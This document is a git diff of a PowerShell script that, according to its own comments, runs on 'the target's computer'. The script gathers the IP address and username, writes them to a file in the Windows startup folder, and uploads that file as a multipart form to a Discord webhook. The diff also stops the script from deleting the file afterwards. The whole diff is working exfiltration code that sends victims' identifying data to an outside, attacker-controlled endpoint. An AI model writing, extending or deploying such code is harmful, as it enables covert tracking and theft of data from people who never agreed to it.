@@ -1,5 +1,6 @@
 # None of the files created will be saved on the target's computer
 # TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead
+
 # Get IPv4 address of the machine
 $ipAddressString = "IPv4 Address"
 # Uncomment the following line when using older versions of Windows without IPv6 support
@@ -21,13 +22,29 @@ $DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile
 
 # Create a text file in the user's startup folder
 $TextContent = "$IPAddress`n$Username"
-$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\$Username.txt"
+$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\$Username.icu"
 $TextContent | Out-File -FilePath $TextFile
 
-# Send the payload to Discord
-Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Body @{
-    content = $TextContent
+# Define a message (commented out for now)
+# $Message = "Message Placeholder"
+
+# Create a multipart form-data payload
+$Boundary = [System.Guid]::NewGuid().ToString()
+$CRLF = "`r`n"
+$Payload = "--$Boundary$CRLF" +
+    "Content-Disposition: form-data; name=`"content`"$CRLF$CRLF$Message$CRLF" +
+    "--$Boundary$CRLF" +
+    "Content-Disposition: form-data; name=`"file`"; filename=`"$Username.txt`"$CRLF" +
+    "Content-Type: application/octet-stream$CRLF$CRLF" +
+    (Get-Content -Path $TextFile) + $CRLF +
+    "--$Boundary--"
+# Set the headers for the request
+$Headers = @{
+    "Content-Type" = "multipart/form-data; boundary=$Boundary"
 }
 
-# Delete the text file
-Remove-Item -Path $TextFile
+# Send the payload to Discord
+Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Headers $Headers -Body $Payload
+
+# # Delete the text file
+# Remove-Item -Path $TextFile
